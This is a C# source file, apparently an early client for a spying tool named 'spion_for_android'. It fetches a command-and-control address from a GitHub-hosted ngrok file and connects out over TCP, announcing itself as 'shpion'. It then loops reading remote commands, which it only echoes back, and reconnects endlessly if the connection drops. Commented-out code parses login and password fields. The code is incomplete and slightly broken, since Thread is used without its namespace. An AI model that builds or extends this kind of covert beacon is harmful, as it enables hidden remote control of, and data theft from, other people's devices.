using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text;

namespace spion_for_android 
{
    /// <summary>
    enum ErrorState
    {
        None, ErrorStream, ErrorTcpClientClientObj, ErrorTcpListener, ErrorTcpClientShpionObj
    }
    class ErrorItem
    {
        private string message;
        private ErrorState errorCode;
        public ErrorItem(ErrorState errorState, string errorMsg)
        {
            message = errorMsg;
            errorCode = errorState;
        }
        public string GetErrorMsg()
        {
            return message;
        }
        public ErrorState GetErrorState()
        {
            return errorCode;
        }

    }

    /// </summary>
    class Pro 
    {
        static void Write(TcpClient stream, string text, ref bool check)
        {
            try
            {
                byte[] buffer = Encoding.UTF8.GetBytes(text);
                stream.GetStream().Write(buffer, 0, buffer.Length);
                stream.GetStream().Flush();
            }
            catch (Exception ex)
            {
                check = false;
                UpdateError(new ErrorItem(ErrorState.ErrorStream, ex.Message), stream);
            }
        }
        static string Read(TcpClient stream, ref bool check)
        {
            string request = "";
            try
            {
                byte[] buffer = new byte[256];
                int size = stream.GetStream().Read(buffer, 0, buffer.Length);
                request = Encoding.UTF8.GetString(buffer, 0, size);
            }
            catch (Exception ex)
            {
                check = false;
                UpdateError(new ErrorItem(ErrorState.ErrorStream, ex.Message), stream);
            }
            return request;
        }
        static void UpdateError(ErrorItem error, TcpClient client)
        {
            try
            {
                switch (error.GetErrorState())
                {
                    case ErrorState.ErrorStream:
                        Console.WriteLine("Disconnected");
                        break;
                    case ErrorState.ErrorTcpClientShpionObj:
                        Console.WriteLine("Disconnected");
                        break;
                    case ErrorState.ErrorTcpClientClientObj:
                        Console.WriteLine("Disconnected");
                        break;
                    case ErrorState.ErrorTcpListener:
                        Console.WriteLine("Disconnected");
                        break;
                    case ErrorState.None:
                        Console.WriteLine("Disconnected");
                        break;

                }
            }
            catch
            {
            }
            Console.WriteLine($"ErrorState = {error.GetErrorState().ToString()} msg = {error.GetErrorMsg()}");
        }
        static void Connect() 
        {
            bool check = true;
            TcpClient client = new TcpClient();
            try { 
           
            string host = "127.0.0.1";
            int port = 0;
                try
                {
                    using (WebClient web_client = new WebClient())
                    {
                        string file = web_client.DownloadString("https://raw.githubusercontent.com/pag6666/ngrok_file/main/ngrok_for_mobila");
                        string[] arr_host = file.Split(":");
                        host = arr_host[0];
                        port = int.Parse(arr_host[1].Trim());
                    }
                    client = new TcpClient(host, port);
                    // write 1
                    Write(client, "1", ref check);
                    string answer = Read(client, ref check);
                    Console.WriteLine(answer);
                    // get result
                    Console.WriteLine(answer);
                    Write(client, "i'am shpion", ref check);
                        Spionobj(client);
                   
                }
                catch {
                    Connect();
                }
            }
            catch (Exception ex)
            {
                UpdateError(new ErrorItem(ErrorState.ErrorTcpClientShpionObj, ex.Message),client);
                Connect();
            }
        }
        static void Spionobj(object obj) 
        {
            bool check = true;
            TcpClient client = (TcpClient)obj;
            try
            {
               /* string info_pack = Read(client, ref check);
                string[] arr_info = info_pack.Split(",");
                string index_name = arr_info[0],login = arr_info[1],password = arr_info[2];*/
                while (check) 
                {
                    string command = Read(client, ref check);
                    Write(client, command + ": shpion", ref check);
                }
            }
            catch (Exception ex) 
            {
                UpdateError(new ErrorItem(ErrorState.ErrorTcpClientShpionObj, ex.Message), client);
                Console.WriteLine("error connect");
                Thread.Sleep(1000);
                Connect();
                
            }
        }
        static void Main() 
        {
            error:
            try
            {
                Connect();
            }
            catch 
            {
                goto error;
            }
        }
    }
}